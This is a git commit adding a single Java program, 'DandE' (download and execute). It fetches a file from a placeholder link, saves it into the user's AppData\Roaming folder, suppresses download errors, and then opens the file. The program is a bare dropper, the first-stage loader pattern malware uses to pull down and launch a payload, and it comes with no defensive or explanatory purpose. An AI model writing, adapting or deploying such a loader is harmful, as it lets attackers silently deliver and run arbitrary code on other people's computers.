b8898dfe6566217c0d6b5041de18f53b2d533db6
pascal25565 <pascal25565@users.noreply.github.com>
2016-09-30 19:45:49 +0200

    Add files via upload

---
+++ de/pascal25565/downloadandexe/DandE.java
@@ -0,0 +1,52 @@
+package de.pascal25565.downloadandexe;
+
+import java.awt.*;
+import java.io.BufferedInputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.net.URL;
+
+public class DandE
+{
+    public static void main(String[] args)
+    {
+        Download("LINK");
+    }
+
+    static BufferedInputStream in = null;
+    static FileOutputStream fout = null;
+    static String filename = "Text.txt";
+
+    public static void Download(String link)
+    {
+        try
+        {
+            in = new BufferedInputStream(new URL(link).openStream());
+            fout = new FileOutputStream("C://Users//" + System.getProperty("user.name") + "/AppData//Roaming//" + filename);
+            final byte data[] = new byte[1024];
+            int count;
+            while ((count = in.read(data, 0, 1024)) != -1)
+            {
+                fout.write(data, 0, count);
+            }
+            System.out.println("Downloaded.");
+            in.close();
+            fout.close();
+        } catch (Exception e)
+        {
+        }
+        try
+        {
+            Execute();
+        } catch (Exception e)
+        {
+            System.out.println(e);
+        }
+    }
+
+    public static void Execute() throws Exception
+    {
+        File f = new File("C://Users//" + System.getProperty("user.name") + "/AppData//Roaming//" + filename);
+        Desktop.getDesktop().open(f);
+    }
+}
